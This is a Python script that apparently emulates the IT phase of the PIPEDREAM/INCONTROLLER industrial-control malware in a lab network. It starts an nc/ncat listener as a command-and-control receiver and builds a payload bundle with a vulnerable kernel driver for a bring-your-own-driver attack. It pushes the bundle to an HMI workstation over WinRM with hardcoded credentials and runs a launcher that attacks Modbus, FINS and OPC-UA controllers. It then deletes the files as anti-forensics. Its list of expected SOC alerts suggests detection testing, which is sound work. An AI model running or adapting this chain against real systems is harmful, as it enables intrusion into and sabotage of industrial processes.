#!/usr/bin/env python3
"""
PIPEDREAM / INCONTROLLER IT Phase

Delivery model (matches real Chernovite attack):
  1. Build pipedream_bundle.zip on Kali (launcher + modules + AsrDrv103.sys)
  2. Transfer ZIP to HMI engineering workstation via WinRM (base64 chunked)
  3. Expand-Archive on HMI
  4. Execute pipedream_launcher.py from HMI - all OT traffic from 192.168.1.55
  5. Cleanup (delete bundle + .sys + service)

All OT attack traffic (FINS, OPC-UA, Modbus, UDP 27127) originates from the
engineering WS (192.168.1.55), not from the attacker directly.

VERIFIED ARTIFACTS (Dragos PIPEDREAM.pdf, 3-0):
  LAZYCARGO : AsrDrv103.sys (CVE-2020-15368) BYOVD kernel rootkit → Event 7045
  DUSTTUNNEL: persistent TCP :8443 C2 tunnel → Event 5156
  EVILSCHOLAR: UDP 27127 multicast + Modbus TCP from eng WS
  BADOMEN   : OMRON FINS TCP :9600 from eng WS
  MOUSEHOLE : OPC-UA session from eng WS
"""

import sys
import os
import subprocess
import socket
import time

SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV  = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')
FILE_XFER    = os.path.join(SCRIPT_DIR, '06_file_transfer_all_methods.py')
BUILD_BUNDLE = os.path.join(SCRIPT_DIR, 'build_pipedream_bundle.py')

HMI_IP   = '192.168.1.55'
HMI_USER = 'operator'
HMI_PASS = 'labpass123'

# HMI paths (Windows)
HMI_TEMP     = r'C:\Users\operator\AppData\Local\Temp'
HMI_ZIP      = fr'{HMI_TEMP}\pd.zip'
HMI_BUNDLE   = fr'{HMI_TEMP}\pd'
HMI_LAUNCHER = fr'{HMI_BUNDLE}\pipedream_launcher.py'
HMI_PYTHON   = r'C:\Users\operator\v3\env\Scripts\python.exe'

BUNDLE_ZIP   = '/tmp/pipedream_bundle.zip'


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        out = (r.stdout + r.stderr).strip()
        if out:
            for line in out.splitlines()[:10]:
                print(f"    {line}")
        return r.returncode == 0, out
    except Exception as e:
        print(f"  [-] {e}")
        return False, str(e)


def _winrm(hmi_ip, hmi_user, hmi_pass, ps_cmd, desc, python_exe=sys.executable, timeout=60):
    """Run a PowerShell command on HMI via WinRM."""
    return _run(desc,
                [python_exe, LATERAL_MOV,
                 '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
                 '--winrm', ps_cmd],
                timeout=timeout)


def run_pipedream_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                            python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  PIPEDREAM / INCONTROLLER - IT PHASE                         ║
║  CHERNOVITE | Dragos 2022 | ZIP delivery → HMI execution     ║
╚══════════════════════════════════════════════════════════════╝

MODEL: Bundle delivered to engineering WS, executed locally.
All OT traffic originates from HMI (192.168.1.55).
""")

    # ── Phase 0: Start DUSTTUNNEL listener on Kali ────────────────────────────
    print("═══ SETUP: Starting DUSTTUNNEL listener on Kali :8443 ═══")
    # Try ncat first, fall back to nc
    for listener_cmd in [
        ['ncat', '-lvp', '8443', '--keep-open'],
        ['nc',   '-lvp', '8443'],
        ['nc',   '-l',   '-p', '8443'],
    ]:
        try:
            subprocess.Popen(listener_cmd,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"  [+] {listener_cmd[0]} listening on :8443 (DUSTTUNNEL receiver)")
            break
        except FileNotFoundError:
            continue
    else:
        print("  [!] ncat/nc not found - DUSTTUNNEL listener not started (TCP :8443 will fail)")
    time.sleep(1)

    # ── Step 1: Build bundle on Kali ─────────────────────────────────────────
    print("\n═══ STEP 1: Build PIPEDREAM bundle on Kali ═══")
    ok, _ = _run("Build pipedream_bundle.zip",
                 [python_exe, BUILD_BUNDLE, '--output', BUNDLE_ZIP], timeout=30)
    if not ok or not os.path.exists(BUNDLE_ZIP):
        print("  [-] Bundle build failed - aborting")
        return False
    size = os.path.getsize(BUNDLE_ZIP)
    print(f"  [+] Bundle ready: {BUNDLE_ZIP} ({size:,} bytes)")

    # ── Step 2: Transfer ZIP to HMI via WinRM (base64 chunked) ───────────────
    print("\n═══ STEP 2: Transfer bundle to HMI via WinRM ═══")
    print(f"  [*] Uploading {BUNDLE_ZIP} → HMI {HMI_ZIP}")
    ok, _ = _run("Transfer pipedream_bundle.zip to HMI",
                 [python_exe, FILE_XFER,
                  '--target', hmi_ip,
                  '--method', 'powershell',
                  '--file', BUNDLE_ZIP],
                 timeout=120)
    # File transfer puts it in C:\Temp\ by default; move to correct path
    _winrm(hmi_ip, hmi_user, hmi_pass,
           fr"powershell -Command "
           fr"if (!(Test-Path '{HMI_TEMP}')) {{ New-Item -ItemType Directory '{HMI_TEMP}' }}; "
           fr"if (Test-Path 'C:\Temp\pipedream_bundle.zip') {{ "
           fr"  Move-Item 'C:\Temp\pipedream_bundle.zip' '{HMI_ZIP}' -Force }}; "
           fr"Write-Output (Test-Path '{HMI_ZIP}')",
           "Move ZIP to correct path on HMI",
           python_exe=python_exe, timeout=20)

    # ── Step 3: Expand-Archive on HMI ────────────────────────────────────────
    print("\n═══ STEP 3: Expand-Archive on HMI ═══")
    print("  [*] Event 4663 (file create) fires for each extracted file")
    _winrm(hmi_ip, hmi_user, hmi_pass,
           fr"powershell -Command "
           fr"Expand-Archive -Path '{HMI_ZIP}' -DestinationPath '{HMI_TEMP}\' -Force; "
           fr"Write-Output EXTRACTED",
           "Expand-Archive on HMI (Event 4663)",
           python_exe=python_exe, timeout=45)

    # ── Step 4: Execute pipedream_launcher.py from HMI ───────────────────────
    print("\n═══ STEP 4: Execute PIPEDREAM launcher from HMI ═══")
    print("  [*] ALL OT traffic will originate from 192.168.1.55")
    print("  [*] LSASS → LAZYCARGO → DUSTTUNNEL → MOUSEHOLE → EVILSCHOLAR → BADOMEN → OT attack")
    _winrm(hmi_ip, hmi_user, hmi_pass,
           fr"powershell -Command "
           fr"$py = if (Test-Path '{HMI_PYTHON}') {{ '{HMI_PYTHON}' }} "
           fr"      else {{ (Get-Command python.exe -EA SilentlyContinue).Source }}; "
           fr"if ($py) {{ & $py '{HMI_LAUNCHER}' 2>&1 }} "
           fr"else {{ Write-Error 'Python not found on HMI' }}",
           "Execute PIPEDREAM launcher on HMI (all modules)",
           python_exe=python_exe, timeout=180)

    # ── Step 5: Cleanup ───────────────────────────────────────────────────────
    print("\n═══ STEP 5: Anti-forensics cleanup ═══")
    _winrm(hmi_ip, hmi_user, hmi_pass,
           fr"powershell -Command "
           fr"Remove-Item -Recurse -Force '{HMI_BUNDLE}' -EA SilentlyContinue; "
           fr"Remove-Item -Force '{HMI_ZIP}' -EA SilentlyContinue; "
           fr"Write-Output CLEANED",
           "Delete bundle from HMI (anti-forensics)",
           python_exe=python_exe, timeout=20)

    print(f"""
[+] PIPEDREAM IT phase complete

Expected XSIAM / SOC alerts:
  • Event 7045  - LAZYCARGO: AsrDrv103 kernel service (CRITICAL BYOVD)
  • Event 5156  - DUSTTUNNEL: outbound TCP :8443 from OT host
  • Event 4688  - python.exe executing from AppData\Local\Temp (suspicious path)
  • Network     - UDP 27127 multicast from 192.168.1.55 (MODICON discovery)
  • Network     - Modbus TCP from 192.168.1.55 → 192.168.1.16:502
  • Network     - FINS TCP from 192.168.1.55 → 192.168.1.12:9600
  • Network     - OPC-UA TCP from 192.168.1.55 → 192.168.1.12:4840 (writes)
""")
    return True


def main():
    import argparse
    p = argparse.ArgumentParser(
        description='PIPEDREAM IT Phase - ZIP delivery to HMI, exec all modules locally')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_pipedream_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
